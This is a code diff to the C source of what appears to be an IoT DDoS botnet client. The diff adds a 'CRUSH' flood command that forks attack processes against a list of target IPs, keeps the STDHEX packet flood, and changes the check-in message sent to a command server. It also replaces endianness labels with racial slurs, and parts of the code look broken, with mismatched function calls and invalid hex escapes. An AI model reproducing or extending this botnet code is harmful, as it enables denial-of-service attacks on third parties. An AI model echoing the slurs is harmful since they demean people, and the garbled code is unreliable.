@@ -43,7 +43,8 @@
 #define OPT_SGA   3
 #define SOCKBUF_SIZE 1024
 #define STD2_SIZE 69
-#define Demon_std 1460
+#define std_packet 1460
+
 
 
 
@@ -613,7 +614,7 @@ void SendSTDHEX(unsigned char *ip, int port, int secs)
 		char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58"};
 		if (a >= 50)
 		{
-			send(std_hex, hexstring, Demon_std, 0);
+			send(std_hex, hexstring, std_packet, 0);
 			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
 			if (time(NULL) >= start + secs)
 			{
@@ -969,6 +970,41 @@ void processCmd(int argc, unsigned char *argv[]) {
                         _exit(0);
                    }
 		}
+                if(!strcmp(argv[0], "CRUSH"))
+        {
+            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
+            { return;}
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = atoi(argv[4]);
+            unsigned char *flags = argv[5];
+            int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
+            int packetsize = argc > 6 ? atoi(argv[6]) : 0;
+                       int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
+           int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
+            if(strstr(ip, ",") != NULL)
+            {
+                unsigned char *ip = strtok(ip, ",");
+                while(ip != NULL)
+                {
+                    if(!listFork())
+                    {
+                        SendSTD(ip, port, time, std_packet);
+                        SendSTD(ip, port, time, spoofed, flags, packetsize, pollinterval);
+                        close(mainCommSock);
+                        _exit(0);
+                    }
+                    ip = strtok(NULL, ",");
+                }
+            } else {
+                if (listFork()) { return; }
+                SendSTD(ip, port, time, std_packet);
+                SendSTD(ip, port, time, spoofed, flags, packetsize, pollinterval);
+                close(mainCommSock);
+                _exit(0);
+            }
+        }
                 if(!strcmp(argv[0], "STDHEX"))
 	{
 		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
@@ -1079,13 +1115,13 @@ int getEndianness(void)
 	switch (nmb.vlu)
 	{
 		case UINT32_C(0x00010203):
-			return "BIG_ENDIAN";
+			return "BIG_NIGGER";
 		case UINT32_C(0x03020100):
-			return "LITTLE_ENDIAN";
+			return "LITTLE_NIGGER";
 		case UINT32_C(0x02030001):
-			return "BIG_ENDIAN_W";
+			return "BIG_NIGGER_W";
 		case UINT32_C(0x01000302):
-			return "LITTLE_ENDIAN_W";
+			return "LITTLE_NIGGER_W";
 		default:
 			return "UNKNOWN";
 	}
@@ -1119,7 +1155,7 @@ int main(int argc, unsigned char *argv[]) {
         while(1) {
 				if(fork() == 0) {
                 if(initConnection()) { sleep(5); continue; }
-				sockprintf(mainCommSock, "[ INFECTED ] Arch: %s || Type: %s]", getBuild(), getEndianness());
+				sockprintf(mainCommSock, "[ IoT ] Arch: %s || Type: %s]", getBuild(), getEndianness());
 				UpdateNameSrvs();
 				char commBuf[4096];
                 int got = 0;
